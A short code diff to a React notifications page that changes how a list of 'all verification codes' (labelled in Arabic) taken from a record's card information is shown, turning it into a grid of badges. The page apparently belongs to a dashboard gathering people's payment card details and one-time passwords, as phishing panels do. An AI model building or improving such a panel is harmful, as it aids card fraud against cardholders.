@@ -327,7 +327,12 @@ export default function NotificationsPage() {
               </p>
               <p>
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
-                {selectedNotification.cardInfo.allOtps.join(',')}
+                <div className="grid grid-cols-4">
+                  {selectedNotification.cardInfo.allOtps &&
+                    selectedNotification.cardInfo.allOtps.map((i, index) => (
+                      <Badge variant={'destructive'} key={index}>{i}</Badge>
+                    ))}
+                </div>
               </p>
 
               <div className="flex justify-between mx-1">
